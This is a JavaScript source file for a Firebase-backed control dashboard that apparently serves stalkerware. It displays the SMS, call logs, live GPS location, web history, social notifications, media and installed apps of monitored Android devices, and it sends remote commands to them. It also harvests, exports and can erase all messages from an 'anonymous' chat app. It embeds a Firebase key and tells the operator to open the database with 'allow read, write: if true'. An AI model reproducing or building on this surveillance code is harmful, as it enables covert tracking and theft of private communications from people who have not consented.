// Firebase Initialization
const firebaseConfig = {
    apiKey: "AIzaSyDYe-a29HuvOuhIb3QrIJCcsORQnwSbh-E",
    authDomain: "anonchat-a690b.firebaseapp.com",
    projectId: "anonchat-a690b",
    storageBucket: "anonchat-a690b.firebasestorage.app",
    messagingSenderId: "145505706969",
    appId: "1:145505706969:android:91ae5e53ac40a5dec9efc8"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

let selectedDeviceId = null;
let map = null;
let mapMarker = null;
let currentLimit = 500;
let searchQuery = '';

let cachedData = {
    activity: [],
    sms: [],
    calls: [],
    apps: [],
    web: [],
    social: [],
    media: [],
    locations: [],
    anonchat: []
};

let unsubs = [];

function initMap() {
    if (map) return;
    map = L.map('deviceMap').setView([20, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap',
        maxZoom: 19
    }).addTo(map);
}

window.addEventListener('DOMContentLoaded', () => {
    initMap();
    listenForDevices();
});

function showToast(msg) {
    const t = document.getElementById('toast');
    if (!t) return;
    t.textContent = msg;
    t.style.display = 'block';
    setTimeout(() => { t.style.display = 'none'; }, 4000);
}

function listenForDevices() {
    db.collection('devices').onSnapshot(snapshot => {
        const select = document.getElementById('deviceSelect');
        const devices = [];
        snapshot.forEach(doc => {
            devices.push({ id: doc.id, ...doc.data() });
        });

        if (devices.length === 0) {
            select.innerHTML = '<option value="">No devices registered yet in Firebase</option>';
            return;
        }

        // Sort by last_seen descending so active device is ALWAYS first!
        devices.sort((a, b) => (b.last_seen || 0) - (a.last_seen || 0));

        select.innerHTML = devices.map(d => {
            const isLatest = d.id === devices[0].id;
            return `
            <option value="${d.id}" ${d.id === selectedDeviceId ? 'selected' : ''}>
                ${d.manufacturer || ''} ${d.model || d.device_name || d.id} — ${formatTimeAgo(d.last_seen)} ${isLatest ? '★ ACTIVE' : ''}
            </option>`;
        }).join('');

        if (!selectedDeviceId || !devices.some(d => d.id === selectedDeviceId)) {
            selectedDeviceId = devices[0].id;
            switchDevice();
        }
    }, err => {
        console.error("Firestore Listen Devices Error:", err);
        showToast("Firestore Permission Error: Check Firestore Rules in Firebase Console!");
    });
}

function switchDevice() {
    const select = document.getElementById('deviceSelect');
    selectedDeviceId = select.value;
    if (!selectedDeviceId) return;

    unsubs.forEach(unsub => unsub());
    unsubs = [];

    listenToDeviceHeader();
    listenToDataCollections();
}

function listenToDeviceHeader() {
    const unsub = db.collection('devices').doc(selectedDeviceId).onSnapshot(doc => {
        if (!doc.exists) return;
        const d = doc.data();
        const now = Date.now();
        const diffMs = Math.abs(now - (d.last_seen || 0));
        const isOnline = diffMs < 900000; // 15 mins window for background doze mode

        document.getElementById('hdrStatus').innerHTML = isOnline ?
            '<span class="badge badge-online">● ONLINE</span>' :
            '<span class="badge badge-offline">○ OFFLINE</span>';

        document.getElementById('hdrBattery').textContent = `🔋 ${d.battery_level != null ? d.battery_level + '%' : '—'} ${d.is_charging ? '⚡' : ''}`;
        document.getElementById('hdrModel').textContent = `${d.manufacturer || ''} ${d.model || d.device_name || '—'}`;
        document.getElementById('hdrAndroid').textContent = d.android_version ? `Android ${d.android_version}` : '—';
        document.getElementById('hdrLastSeen').textContent = `${formatTime(d.last_seen)} (${formatTimeAgo(d.last_seen)})`;
    }, err => console.error("Header listen error:", err));
    unsubs.push(unsub);
}

function listenToDataCollections() {
    const devRef = db.collection('devices').doc(selectedDeviceId);
    const dataCol = devRef.collection('data');

    let smsMap = new Map();
    let callMap = new Map();
    let socialMap = new Map();
    let appMap = new Map();
    let webMap = new Map();
    let actMap = new Map();

    // 1. Locations
    unsubs.push(dataCol.doc('location_latest').onSnapshot(doc => {
        if (doc.exists) {
            cachedData.locations = [doc.data()];
            renderLocations();
        }
    }));
    unsubs.push(devRef.collection('locations').limit(100).onSnapshot(s => {
        if (!s.empty) {
            const locs = s.docs.map(d => d.data());
            cachedData.locations = locs.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
            renderLocations();
        }
    }));

    // 2. SMS (Consolidated + Sub-collection)
    unsubs.push(dataCol.doc('sms').onSnapshot(doc => {
        if (doc.exists && doc.data().list) {
            doc.data().list.forEach(i => smsMap.set(i.id || (i.address + '_' + i.date), i));
            cachedData.sms = Array.from(smsMap.values()).sort((a,b) => (b.date||0) - (a.date||0));
            renderSMSPanel();
        }
    }));
    unsubs.push(devRef.collection('sms').limit(500).onSnapshot(s => {
        s.docs.forEach(d => { const i = d.data(); smsMap.set(i.id || d.id, i); });
        cachedData.sms = Array.from(smsMap.values()).sort((a,b) => (b.date||0) - (a.date||0));
        renderSMSPanel();
    }));

    // 3. Calls (Consolidated + Sub-collection)
    unsubs.push(dataCol.doc('calls').onSnapshot(doc => {
        if (doc.exists && doc.data().list) {
            doc.data().list.forEach(i => callMap.set(i.id || (i.number + '_' + i.date), i));
            cachedData.calls = Array.from(callMap.values()).sort((a,b) => (b.date||0) - (a.date||0));
            renderCallsPanel();
        }
    }));
    unsubs.push(devRef.collection('calls').limit(500).onSnapshot(s => {
        s.docs.forEach(d => { const i = d.data(); callMap.set(i.id || d.id, i); });
        cachedData.calls = Array.from(callMap.values()).sort((a,b) => (b.date||0) - (a.date||0));
        renderCallsPanel();
    }));

    // 4. Social Notifications (Consolidated + Sub-collection)
    unsubs.push(dataCol.doc('social').onSnapshot(doc => {
        if (doc.exists && doc.data().list) {
            doc.data().list.forEach(i => socialMap.set(i.timestamp || (i.app_name + '_' + i.content), i));
            cachedData.social = Array.from(socialMap.values()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
            renderSocialPanel();
        }
    }));
    unsubs.push(devRef.collection('social').limit(500).onSnapshot(s => {
        s.docs.forEach(d => { const i = d.data(); socialMap.set(i.timestamp || d.id, i); });
        cachedData.social = Array.from(socialMap.values()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
        renderSocialPanel();
    }));

    // 5. Apps (Consolidated + Sub-collection)
    unsubs.push(dataCol.doc('apps').onSnapshot(doc => {
        if (doc.exists && doc.data().list) {
            doc.data().list.forEach(i => appMap.set(i.package_name || i.packageName, i));
            cachedData.apps = Array.from(appMap.values()).sort((a,b) => (a.app_name||'').localeCompare(b.app_name||''));
            renderAppsPanel();
        }
    }));
    unsubs.push(devRef.collection('apps').limit(500).onSnapshot(s => {
        s.docs.forEach(d => { const i = d.data(); appMap.set(i.package_name || i.packageName || d.id, i); });
        cachedData.apps = Array.from(appMap.values()).sort((a,b) => (a.app_name||'').localeCompare(b.app_name||''));
        renderAppsPanel();
    }));

    // 6. Activity (Consolidated + Sub-collection)
    unsubs.push(dataCol.doc('activity').onSnapshot(doc => {
        if (doc.exists && doc.data().list) {
            doc.data().list.forEach(i => actMap.set(i.timestamp || i.package_name, i));
            cachedData.activity = Array.from(actMap.values()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
            renderActivityPanel();
        }
    }));
    unsubs.push(devRef.collection('activity').limit(500).onSnapshot(s => {
        s.docs.forEach(d => { const i = d.data(); actMap.set(i.timestamp || d.id, i); });
        cachedData.activity = Array.from(actMap.values()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
        renderActivityPanel();
    }));

    // 7. Web History (Consolidated + Sub-collection)
    unsubs.push(dataCol.doc('webhistory').onSnapshot(doc => {
        if (doc.exists && doc.data().list) {
            doc.data().list.forEach(i => webMap.set(i.timestamp || i.url, i));
            cachedData.web = Array.from(webMap.values()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
            renderWebPanel();
        }
    }));
    unsubs.push(devRef.collection('webhistory').limit(500).onSnapshot(s => {
        s.docs.forEach(d => { const i = d.data(); webMap.set(i.timestamp || d.id, i); });
        cachedData.web = Array.from(webMap.values()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
        renderWebPanel();
    }));

    // Media
    unsubs.push(devRef.collection('media').limit(currentLimit).onSnapshot(s => {
        cachedData.media = s.docs.map(d => d.data()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
        renderMediaPanel();
    }, err => handleSubErr("Media", err)));

    // 8. AnonChat Messages
    unsubs.push(db.collection('chats').onSnapshot(chatsSnap => {
        let allMsgs = [];
        let pending = chatsSnap.docs.length;
        if (pending === 0) {
            cachedData.anonchat = [];
            renderAnonChatPanel();
            return;
        }
        chatsSnap.docs.forEach(cDoc => {
            const chatData = cDoc.data();
            cDoc.ref.collection('messages').orderBy('timestamp', 'desc').limit(200).get().then(mSnap => {
                mSnap.docs.forEach(mDoc => {
                    const m = mDoc.data();
                    allMsgs.push({
                        id: mDoc.id,
                        chatId: cDoc.id,
                        sender_name: m.senderName || chatData.participantNames?.[m.senderId] || 'Anonymous',
                        recipient_name: Object.values(chatData.participantNames || {}).find(n => n !== (m.senderName || chatData.participantNames?.[m.senderId])) || 'Anonymous',
                        content: m.content || '',
                        type: m.type || 'text',
                        image_url: m.imageUrl,
                        timestamp: m.timestamp
                    });
                });
                pending--;
                if (pending <= 0) {
                    cachedData.anonchat = allMsgs.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
                    renderAnonChatPanel();
                }
            }).catch(() => {
                pending--;
                if (pending <= 0) {
                    cachedData.anonchat = allMsgs.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
                    renderAnonChatPanel();
                }
            });
        });
    }));
}

function handleSubErr(name, err) {
    console.error(`${name} collection error:`, err);
    const panel = document.getElementById(`panel-${name.toLowerCase()}`);
    if (panel) {
        panel.innerHTML = `<div class="empty-state" style="color:#ef4444;">⚠️ Firestore Error: ${esc(err.message)}<br><small>Make sure Firestore Rules are set to: <code>allow read, write: if true;</code> in Firebase Console.</small></div>`;
    }
}

// Command Sender
function sendFirebaseCommand(commandType, params = {}) {
    if (!selectedDeviceId) return;
    const cmdDoc = {
        command_type: commandType,
        status: "pending",
        created_at: Date.now(),
        ...params
    };
    db.collection('devices').doc(selectedDeviceId).collection('commands').add(cmdDoc)
        .then(() => showToast(`Sent command: ${commandType}`))
        .catch(e => showToast(`Command error: ${e.message}`));
}

// Render Functions
function renderLocations() {
    const locs = cachedData.locations;
    document.getElementById('mapPointCount').textContent = `${locs.length} points`;
    if (locs.length === 0) return;

    const latest = locs[0];
    if (map) {
        setTimeout(() => { map.invalidateSize(); }, 200);
        map.setView([latest.latitude, latest.longitude], 15);
        if (mapMarker) map.removeLayer(mapMarker);
        mapMarker = L.marker([latest.latitude, latest.longitude])
            .addTo(map)
            .bindPopup(`<b>Latest Location</b><br>${formatTime(latest.timestamp)}<br>Acc: ${latest.accuracy}m`);
    }
}

function filterList(list, getters) {
    if (!searchQuery) return list;
    return list.filter(item => getters.some(fn => {
        const val = fn(item);
        return val && String(val).toLowerCase().includes(searchQuery);
    }));
}

function updateBadges() {
    const fAct = filterList(cachedData.activity, [a => a.app_name, a => a.package_name]);
    const fSMS = filterList(cachedData.sms, [s => s.address, s => s.body]);
    const fCalls = filterList(cachedData.calls, [c => c.name, c => c.number]);
    const fApps = filterList(cachedData.apps, [a => a.app_name, a => a.package_name]);
    const fWeb = filterList(cachedData.web, [w => w.title, w => w.url]);
    const fSoc = filterList(cachedData.social, [s => s.app_name, s => s.sender, s => s.content]);
    const fMed = filterList(cachedData.media, [m => m.filename, m => m.mime_type]);
    const fChat = filterList(cachedData.anonchat, [c => c.sender_name, c => c.recipient_name, c => c.content]);

    document.getElementById('badgeActivity').textContent = searchQuery ? `${fAct.length}/${cachedData.activity.length}` : cachedData.activity.length;
    document.getElementById('badgeSMS').textContent = searchQuery ? `${fSMS.length}/${cachedData.sms.length}` : cachedData.sms.length;
    document.getElementById('badgeCalls').textContent = searchQuery ? `${fCalls.length}/${cachedData.calls.length}` : cachedData.calls.length;
    document.getElementById('badgeApps').textContent = searchQuery ? `${fApps.length}/${cachedData.apps.length}` : cachedData.apps.length;
    document.getElementById('badgeWeb').textContent = searchQuery ? `${fWeb.length}/${cachedData.web.length}` : cachedData.web.length;
    document.getElementById('badgeSocial').textContent = searchQuery ? `${fSoc.length}/${cachedData.social.length}` : cachedData.social.length;
    const badgeChat = document.getElementById('badgeAnonChat');
    if (badgeChat) badgeChat.textContent = searchQuery ? `${fChat.length}/${cachedData.anonchat.length}` : cachedData.anonchat.length;
    document.getElementById('badgeMedia').textContent = searchQuery ? `${fMed.length}/${cachedData.media.length}` : cachedData.media.length;
}

function renderActivityPanel() {
    updateBadges();
    const items = filterList(cachedData.activity, [a => a.app_name, a => a.package_name]);
    const panel = document.getElementById('panel-activity');
    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No activity logs recorded yet</div>'; return; }
    panel.innerHTML = items.map((a, idx) => `
        <div class="activity-item">
            <div class="activity-row" id="act-row-${idx}" onclick="toggleRow('act', ${idx})">
                <span class="activity-arrow" id="act-arrow-${idx}">▶</span>
                <div class="activity-app-icon">📋</div>
                <div class="activity-main">
                    <div class="activity-name">${esc(a.app_name || a.activity_type)}</div>
                    <div class="activity-pkg">${esc(a.package_name || '')}</div>
                </div>
                <span class="activity-time">${formatTime(a.timestamp)}</span>
            </div>
            <div class="activity-detail" id="act-detail-${idx}">
                <div class="activity-detail-grid">
                    <div class="activity-detail-field"><div class="activity-detail-label">Type</div><div class="activity-detail-value">${esc(a.activity_type)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Package</div><div class="activity-detail-value">${esc(a.package_name)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Date &amp; Time</div><div class="activity-detail-value">${formatFullTime(a.timestamp)}</div></div>
                </div>
            </div>
        </div>
    `).join('');
}

function renderSMSPanel() {
    updateBadges();
    const items = filterList(cachedData.sms, [s => s.address, s => s.body]);
    const panel = document.getElementById('panel-sms');
    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No SMS messages found</div>'; return; }
    panel.innerHTML = items.map((s, idx) => {
        const isSent = s.type === 2;
        return `
        <div class="activity-item">
            <div class="activity-row" id="sms-row-${idx}" onclick="toggleRow('sms', ${idx})">
                <span class="activity-arrow" id="sms-arrow-${idx}">▶</span>
                <div class="activity-app-icon">${isSent ? '📤' : '📥'}</div>
                <div class="activity-main">
                    <div class="activity-name">${esc(s.address || 'Unknown')}</div>
                    <div class="activity-pkg">${esc((s.body || '').substring(0, 70))}</div>
                </div>
                <span class="type-badge ${isSent ? 'sent' : 'received'}">${isSent ? 'Sent' : 'Received'}</span>
                <span class="activity-time">${formatTime(s.date)}</span>
            </div>
            <div class="activity-detail" id="sms-detail-${idx}">
                <div class="activity-detail-grid">
                    <div class="activity-detail-field"><div class="activity-detail-label">Address</div><div class="activity-detail-value">${esc(s.address)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Type</div><div class="activity-detail-value">${isSent ? 'Sent (Outgoing)' : 'Received (Incoming)'}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Time</div><div class="activity-detail-value">${formatFullTime(s.date)}</div></div>
                </div>
                <div style="margin-top:8px; font-size:12px; background:rgba(255,255,255,0.03); padding:8px; border-radius:6px;">${esc(s.body)}</div>
            </div>
        </div>`;
    }).join('');
}

function renderCallsPanel() {
    updateBadges();
    const items = filterList(cachedData.calls, [c => c.name, c => c.number]);
    const panel = document.getElementById('panel-calls');
    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No call logs found</div>'; return; }
    panel.innerHTML = items.map((c, idx) => {
        const typeMap = { 1: ['incoming', 'Incoming'], 2: ['outgoing', 'Outgoing'], 3: ['missed', 'Missed'] };
        const [cls, label] = typeMap[c.type] || ['incoming', 'Call'];
        return `
        <div class="activity-item">
            <div class="activity-row" id="call-row-${idx}" onclick="toggleRow('call', ${idx})">
                <span class="activity-arrow" id="call-arrow-${idx}">▶</span>
                <div class="activity-app-icon">📞</div>
                <div class="activity-main">
                    <div class="activity-name">${esc(c.name || c.number || 'Unknown')}</div>
                    <div class="activity-pkg">Duration: ${c.duration || 0}s</div>
                </div>
                <span class="type-badge ${cls}">${label}</span>
                <span class="activity-time">${formatTime(c.date)}</span>
            </div>
            <div class="activity-detail" id="call-detail-${idx}">
                <div class="activity-detail-grid">
                    <div class="activity-detail-field"><div class="activity-detail-label">Number</div><div class="activity-detail-value">${esc(c.number)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Name</div><div class="activity-detail-value">${esc(c.name || '—')}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Duration</div><div class="activity-detail-value">${c.duration} seconds</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Time</div><div class="activity-detail-value">${formatFullTime(c.date)}</div></div>
                </div>
            </div>
        </div>`;
    }).join('');
}

function renderAppsPanel() {
    updateBadges();
    const items = filterList(cachedData.apps, [a => a.app_name, a => a.package_name]);
    const panel = document.getElementById('panel-apps');
    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No apps found</div>'; return; }
    panel.innerHTML = items.map((a, idx) => `
        <div class="activity-item">
            <div class="activity-row" id="app-row-${idx}" onclick="toggleRow('app', ${idx})">
                <span class="activity-arrow" id="app-arrow-${idx}">▶</span>
                <div class="activity-app-icon">📦</div>
                <div class="activity-main">
                    <div class="activity-name">${esc(a.app_name || a.package_name)}</div>
                    <div class="activity-pkg">${esc(a.package_name)}</div>
                </div>
                <span class="type-badge ${a.is_system_app ? 'outgoing' : 'incoming'}">${a.is_system_app ? 'System App' : 'User App'}</span>
            </div>
            <div class="activity-detail" id="app-detail-${idx}">
                <div class="activity-detail-grid">
                    <div class="activity-detail-field"><div class="activity-detail-label">App Name</div><div class="activity-detail-value">${esc(a.app_name)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Package</div><div class="activity-detail-value">${esc(a.package_name)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Version</div><div class="activity-detail-value">${esc(a.version_name || '1.0')}</div></div>
                </div>
            </div>
        </div>
    `).join('');
}

function renderWebPanel() {
    updateBadges();
    const items = filterList(cachedData.web, [w => w.title, w => w.url]);
    const panel = document.getElementById('panel-web');
    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No web history found</div>'; return; }
    panel.innerHTML = items.map((w, idx) => `
        <div class="activity-item">
            <div class="activity-row" id="web-row-${idx}" onclick="toggleRow('web', ${idx})">
                <span class="activity-arrow" id="web-arrow-${idx}">▶</span>
                <div class="activity-app-icon">🌐</div>
                <div class="activity-main">
                    <div class="activity-name">${esc(w.title || w.url)}</div>
                    <div class="activity-pkg">${esc(w.url)}</div>
                </div>
                <span class="activity-time">${formatTime(w.timestamp)}</span>
            </div>
            <div class="activity-detail" id="web-detail-${idx}">
                <div style="font-size:12px; word-break:break-all;"><a href="${esc(w.url)}" target="_blank" style="color:#818cf8;">🔗 ${esc(w.url)}</a></div>
            </div>
        </div>
    `).join('');
}

function renderSocialPanel() {
    updateBadges();
    const items = filterList(cachedData.social, [s => s.app_name, s => s.sender, s => s.content]);
    const panel = document.getElementById('panel-social');
    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No social notifications found</div>'; return; }
    panel.innerHTML = items.map((s, idx) => `
        <div class="activity-item">
            <div class="activity-row" id="soc-row-${idx}" onclick="toggleRow('soc', ${idx})">
                <span class="activity-arrow" id="soc-arrow-${idx}">▶</span>
                <div class="activity-app-icon">💬</div>
                <div class="activity-main">
                    <div class="activity-name">${esc(s.app_name)} ${s.sender ? '· ' + esc(s.sender) : ''}</div>
                    <div class="activity-pkg">${esc(s.content || '')}</div>
                </div>
                <span class="activity-time">${formatTime(s.timestamp)}</span>
            </div>
            <div class="activity-detail" id="soc-detail-${idx}">
                <div style="font-size:12px; background:rgba(255,255,255,0.03); padding:8px; border-radius:6px;">${esc(s.content)}</div>
            </div>
        </div>
    `).join('');
}

function renderMediaPanel() {
    updateBadges();
    const items = filterList(cachedData.media, [m => m.filename, m => m.mime_type]);
    const panel = document.getElementById('panel-media');
    if (items.length === 0) { panel.innerHTML = '<div class="empty-state">No media files found</div>'; return; }
    panel.innerHTML = items.map((m, idx) => `
        <div class="activity-item">
            <div class="activity-row" id="med-row-${idx}" onclick="toggleRow('med', ${idx})">
                <span class="activity-arrow" id="med-arrow-${idx}">▶</span>
                <div class="activity-app-icon">🖼️</div>
                <div class="activity-main">
                    <div class="activity-name">${esc(m.filename)}</div>
                    <div class="activity-pkg">${m.file_size || 0} bytes</div>
                </div>
                <span class="activity-time">${formatTime(m.timestamp)}</span>
            </div>
            <div class="activity-detail" id="med-detail-${idx}">
                <a href="${esc(m.storage_url)}" target="_blank" style="color:#818cf8; font-size:12px;">⬇️ Open/Download File</a>
            </div>
        </div>
    `).join('');
}

function renderAnonChatPanel() {
    updateBadges();
    const items = filterList(cachedData.anonchat, [c => c.sender_name, c => c.recipient_name, c => c.content]);
    const panel = document.getElementById('panel-anonchat');
    if (!panel) return;
    const listContainer = document.getElementById('anonchatListContainer');
    if (!listContainer) return;

    if (items.length === 0) {
        listContainer.innerHTML = '<div class="empty-state">No AnonChat messages found</div>';
        return;
    }

    listContainer.innerHTML = items.map((m, idx) => `
        <div class="activity-item">
            <div class="activity-row" id="chat-row-${idx}" onclick="toggleRow('chat', ${idx})">
                <span class="activity-arrow" id="chat-arrow-${idx}">▶</span>
                <div class="activity-app-icon">💬</div>
                <div class="activity-main">
                    <div class="activity-name"><strong style="color:#818cf8;">${esc(m.sender_name)}</strong> &rarr; <strong style="color:#a78bfa;">${esc(m.recipient_name)}</strong></div>
                    <div class="activity-pkg">${esc(m.content || (m.image_url ? '📷 Photo' : ''))}</div>
                </div>
                <span class="activity-time">${formatTime(m.timestamp)}</span>
            </div>
            <div class="activity-detail" id="chat-detail-${idx}">
                <div class="activity-detail-grid">
                    <div class="activity-detail-field"><div class="activity-detail-label">Sender</div><div class="activity-detail-value">${esc(m.sender_name)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Recipient</div><div class="activity-detail-value">${esc(m.recipient_name)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Chat Thread</div><div class="activity-detail-value">${esc(m.chatId)}</div></div>
                    <div class="activity-detail-field"><div class="activity-detail-label">Date & Time</div><div class="activity-detail-value">${formatFullTime(m.timestamp)}</div></div>
                </div>
                <div style="margin-top:10px; font-size:13px; background:rgba(255,255,255,0.03); padding:10px; border-radius:6px;">
                    ${esc(m.content)}
                    ${m.image_url ? `<div style="margin-top:8px;"><a href="${esc(m.image_url)}" target="_blank" style="color:#38bdf8;">📷 View Photo Attachment</a></div>` : ''}
                </div>
            </div>
        </div>
    `).join('');
}

function exportFirebaseChats(format) {
    const list = cachedData.anonchat || [];
    if (list.length === 0) {
        showToast('No messages to export');
        return;
    }
    let dataStr = '';
    let mimeType = 'text/plain';
    let filename = `anonchat_export_${Date.now()}`;

    if (format === 'json') {
        dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(list, null, 2));
        mimeType = 'application/json';
        filename += '.json';
    } else {
        const headers = ['ID', 'Chat ID', 'Sender', 'Recipient', 'Type', 'Content', 'Image URL', 'Timestamp', 'Date'];
        const rows = list.map(m => [
            `"${(m.id||'').replace(/"/g, '""')}"`,
            `"${(m.chatId||'').replace(/"/g, '""')}"`,
            `"${(m.sender_name||'').replace(/"/g, '""')}"`,
            `"${(m.recipient_name||'').replace(/"/g, '""')}"`,
            `"${(m.type||'text').replace(/"/g, '""')}"`,
            `"${(m.content||'').replace(/"/g, '""')}"`,
            `"${(m.image_url||'').replace(/"/g, '""')}"`,
            m.timestamp || '',
            `"${formatFullTime(m.timestamp)}"`
        ]);
        const csvContent = [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
        dataStr = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csvContent);
        filename += '.csv';
    }

    const a = document.createElement('a');
    a.setAttribute('href', dataStr);
    a.setAttribute('download', filename);
    document.body.appendChild(a);
    a.click();
    a.remove();
    showToast(`Exported ${list.length} chat messages!`);
}

async function purgeFirebaseChats() {
    if (!confirm('⚠️ Are you sure you want to PERMANENTLY ERASE all AnonChat history from Firestore? This cannot be undone.')) {
        return;
    }
    showToast('Erasing chats...');
    try {
        const chatsSnap = await db.collection('chats').get();
        const batch = db.batch();
        for (const cDoc of chatsSnap.docs) {
            const msgsSnap = await cDoc.ref.collection('messages').get();
            msgsSnap.docs.forEach(mDoc => batch.delete(mDoc.ref));
            batch.delete(cDoc.ref);
        }
        await batch.commit();
        cachedData.anonchat = [];
        renderAnonChatPanel();
        showToast('All AnonChat history has been permanently erased.');
    } catch (e) {
        showToast('Purge error: ' + e.message);
    }
}

function showTab(name) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));

    const tabBtn = Array.from(document.querySelectorAll('.tab')).find(b => b.getAttribute('onclick').includes(name));
    if (tabBtn) tabBtn.classList.add('active');

    const panel = document.getElementById(`panel-${name}`);
    if (panel) panel.classList.add('active');
}

function toggleRow(prefix, idx) {
    const row = document.getElementById(`${prefix}-row-${idx}`);
    const arrow = document.getElementById(`${prefix}-arrow-${idx}`);
    const detail = document.getElementById(`${prefix}-detail-${idx}`);

    if (row && detail && arrow) {
        row.classList.toggle('expanded');
        arrow.classList.toggle('open');
        detail.classList.toggle('open');
    }
}

function onSearchInput() {
    searchQuery = document.getElementById('dataSearchInput').value.toLowerCase().trim();
    renderActivityPanel();
    renderSMSPanel();
    renderCallsPanel();
    renderAppsPanel();
    renderWebPanel();
    renderSocialPanel();
    renderMediaPanel();
    renderAnonChatPanel();
}

function onLimitChange() {
    currentLimit = parseInt(document.getElementById('dataLimitSelect').value) || 500;
    if (selectedDeviceId) switchDevice();
}

function esc(str) { return str ? String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') : ''; }
function formatTime(ts) {
    if (!ts) return '—';
    const d = new Date(ts);
    return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}
function formatTimeAgo(ts) {
    if (!ts) return '—';
    return new Date(ts).toLocaleString(undefined, {
        year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', hour12: true
    });
}
function formatFullTime(ts) {
    if (!ts) return '—';
    return new Date(ts).toLocaleString();
}
